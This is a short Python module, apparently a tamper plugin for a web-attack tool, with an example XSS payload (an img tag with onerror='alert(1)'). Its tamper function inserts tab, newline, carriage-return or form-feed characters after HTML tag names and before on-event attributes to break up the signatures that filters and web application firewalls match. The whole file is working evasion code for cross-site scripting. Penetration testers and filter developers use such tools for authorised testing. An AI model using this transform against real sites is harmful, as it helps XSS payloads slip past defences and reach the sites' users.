import random
import re

__example_payload__ = '<img src=x onerror="alert(1)">'
__type__ = "inject whitespace (tab/newline/CR/FF) inside HTML tags to split attribute signatures"
__category__ = "xss"
__chain_stage__ = "lexical"
__contexts__ = ("html", "attribute")

# HTML allows tab/newline/CR/formfeed between attributes and after the tag name
_WHITESPACE = ("\t", "\n", "\r", "\x0c")
_OPEN_TAG = re.compile(r"<([a-zA-Z][a-zA-Z0-9]*)")
_ON_ATTR = re.compile(r"\b(on[a-z]+)(\s*=)")


def _ws(count):
    return random.choice(_WHITESPACE) * count


def tamper(payload, **kwargs):
    if not payload:
        return payload

    count = random.randint(1, 2)
    ws = _ws(count)
    retval = _OPEN_TAG.sub(lambda m: m.group(0) + ws, payload)
    retval = _ON_ATTR.sub(lambda m: ws + m.group(1) + m.group(2), retval)
    return retval
